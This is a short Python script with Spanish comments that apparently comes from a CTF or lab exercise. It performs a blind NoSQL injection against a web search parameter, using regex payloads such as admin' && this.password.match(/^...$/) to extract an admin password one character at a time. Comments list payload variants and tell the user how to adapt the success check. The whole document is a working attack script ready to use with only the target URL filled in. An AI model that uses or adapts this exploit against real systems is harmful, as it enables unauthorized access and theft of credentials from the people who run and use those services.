import urllib.request
import string
# Ejemplo del search en NoSQL, primero probar manualmente, luego modificar el script
# /?search=admin'%20%26%26%20this.password.match(/"+payload+"/)%00
# /?search=admin'%20%26%26%20this.password.match(/"+payload+"/)%00
# /?search=admin'%20%26%26%20this.passwordzz.match(/"+payload+"/)%00
# /?search=admin'%20%26%26%20this.password.match(/"+payload+"/)//
# /?search=admin'%20%26%26%20this.password.match(/"+payload+"/)//
# /?search=admin'%20%26%26%20this.passwordzz.match(/"+payload+"/)//

URL="http://xxxxxxx"

def check(payload):
    url=URL+"/?search=admin'%20%26%26%20this.password.match(/"+payload+"/)%00"
    # Remover el comentario del "print" si se desea revisar avance en el URL
    # print(url)
    resp = urllib.request.urlopen(url)
    data = resp.read()
    # Modificar el resultado de success, a la que mas se adapte
    return ">admin<" in str(data)

# Caracter,digitos y caracter especial de "-"
CHARSET=list("-"+string.ascii_lowercase+string.digits)
password=""

# concatenar caracter por caracter y si no encuentra caracter sale del while
while True:
    for c in CHARSET:
        # Remover el comentario del "print" si se desea revisar detalles
        # print("Trying: "+c+" for "+password)
        result = password+c
        if check("^"+result+".*$"):
            password+=c
            print("[-] find a char:{}".format(password))
            break
        elif c==CHARSET[-1]:
            print(password)
            exit(0)
